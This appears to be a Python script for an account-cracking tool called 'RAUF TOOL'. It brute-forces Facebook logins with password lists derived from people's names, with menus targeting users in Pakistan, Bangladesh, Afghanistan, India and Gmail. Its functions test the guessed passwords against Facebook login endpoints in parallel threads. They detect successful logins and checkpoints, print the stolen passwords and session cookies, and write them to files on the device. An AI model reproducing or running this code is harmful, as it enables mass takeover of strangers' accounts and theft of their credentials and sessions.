#SC FUCKED _______________BY AHSAM UL HAQ JOIYA
...
print('\n \033[1;32m[√]\r\r\033[1;33m WELCOME  TO RAUF TOOL\033[1;37m...!')
...
print('\n \033[1;32m[√]\r\r\033[1;33m WELCOME  TO RAUF TOOL...!')
...
try:
        ...
        os.system('xdg-open https://chat.whatsapp.com/CNgCHZuPLAOEFACBTNJ34p')
#============Capture Protection============#
...
logo=("""\033[1;37m       
 ...
 \033[1;37m   .#####   ######  ##  ##  ####
   \033[92;1m .##  ##  ##  ##  ##  ##  ##
    ...
    ................................                                                                                                    
\033[1;33m═══════════════════════════════════════
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  AUTHOR    : 🤣🤣🤣\033[92;1m•
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  FACEBOOK: 🤣🤣🤣
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  GITHUB      : 🤩🤩🤩
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  VERSION    : \92 3409217324
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  YOUR MIND IS YOUR BEST WEAPON:\033[1;92mcksj7507@gmail.com
\033[1;33m════════════════════════════════════════\033[1;33m""")   
def line():
	print(f'\033[1;37m-----------------------------------------------')
...
def menu():
    try:
                ...
                if x == ("***"):
                        ...
                        print('\033[1;31m[\033[1;32m2\033[1;31m]\033[1;37m RANDOM CRACK')                                    
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                print(' \033[1;31m[\033[1;32m1\033[1;31m]\033[1;37m PAKISTAN CLONING\n \033[1;31m[\033[1;32m2\033[1;31m]\033[1;37m BANGLADESH CLONING\n \033[1;31m[\033[1;32m3\033[1;31m]\033[1;37m AFGHANISTAN CLONING\n \033[1;31m[\033[1;32m4\033[1;31m]\033[1;37m INDIA CLONING\n \033[1;31m[\033[1;32m5\033[1;31m]\033[1;37m GMAIL CLONING\n \033[1;31m[\033[1;32m0\033[1;31m]\033[1;37m BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
...
def gmail():
                ...
                with tred(max_workers=30) as S1N:
                        ...
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] SELECT EMAIL: \033[1;32m'+domain)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] USE FLIGHT MODE FOR SPEED UP \033[1;97m')
                        line()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRAUF\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\033[96;1 [RAUF-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RAUF-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAUF-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RAUF-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAUF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRAUF\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [RAUF-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				line()
				open('/sdcard/RAUF-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [RAUF-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/RAUF-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRAUF\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				open('/sdcard/RAUF-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [RAUF-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/RAUF-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    'user-agent': S1(),}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [RAUF-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/RAUF-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [RAUF-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/RAUF-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mRAUF-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRAUF\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
